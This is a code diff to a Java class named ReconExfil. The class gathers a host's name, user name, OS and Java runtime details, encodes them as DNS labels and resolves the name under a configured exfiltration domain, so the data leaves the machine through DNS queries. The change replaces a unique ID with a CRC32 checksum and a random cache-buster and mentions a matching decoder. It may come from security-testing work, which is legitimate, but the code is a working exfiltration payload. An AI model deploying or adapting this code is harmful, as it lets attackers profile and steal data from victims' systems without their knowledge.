@@ -7,6 +7,8 @@ import java.security.SecureRandom;
 import java.util.Map;
 import java.util.Properties;
 import java.util.Random;
+import java.util.zip.CRC32;
+import java.util.zip.Checksum;
 
 public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
@@ -78,28 +80,33 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
         String username = getUsername(envVars, javaProps);
         String osInfo = getOsInfo(javaProps);
         String runtimeInfo = getRuntimeInfo(javaProps);
-        String uniqueId = getUniqueId();
 
         /*
-         * Fields (other than uniqueId) may be re-arranged in order of priority, but ReconExfilDecoder naively assumes
-         * a certain order for its labels.
-         * The last field(s) may be automatically excluded if they don't fit into the domain name.
+         * Fields may be re-arranged in order of priority, but ReconExfilDecoder naively assumes a certain order for
+         * its labels. The last field(s) may be automatically excluded if they don't fit into the domain name.
          */
-        String fullExfilDnsName = generateEncodedDomainName(uniqueId, hostname, username, osInfo, runtimeInfo);
+        String fullExfilDnsName = generateEncodedDomainName(hostname, username, osInfo, runtimeInfo);
         resolve(fullExfilDnsName);
     }
 
-    String generateEncodedDomainName(String uniqueId, String... fields) {
-        String lastPart = uniqueId + "." + CONF_EXFIL_DNS;
+    String generateEncodedDomainName(String... fields) {
+        String cacheBusterValue = generateCacheBusterValue();
+        int lastPartLength = (Long.MAX_VALUE + "." + cacheBusterValue + "." + CONF_EXFIL_DNS).length();
+        Checksum checksum = new CRC32();
+
         StringBuilder domainBuilder = new StringBuilder();
         for (String field : fields) {
             String encodedField = encode(field);
             String addEncodedPart = encodedField + ".";
-            if (addEncodedPart.length() + domainBuilder.length() + lastPart.length() <= CONF_DOMAIN_MAX_LEN) {
+            if (addEncodedPart.length() + domainBuilder.length() + lastPartLength <= CONF_DOMAIN_MAX_LEN) {
                 domainBuilder.append(addEncodedPart);
+                checksum.update(field.getBytes(StandardCharsets.UTF_8));
             }
         }
-        domainBuilder.append(lastPart);
+
+        domainBuilder.append(checksum.getValue()).append(".");
+        domainBuilder.append(cacheBusterValue).append(".");
+        domainBuilder.append(CONF_EXFIL_DNS);
 
         return domainBuilder.toString();
     }
@@ -186,7 +193,7 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
         return value == null || value.isEmpty();
     }
 
-    static String getUniqueId() {
+    static String generateCacheBusterValue() {
         Random rng = new SecureRandom();
         return "" + rng.nextInt(0, Integer.MAX_VALUE);
     }
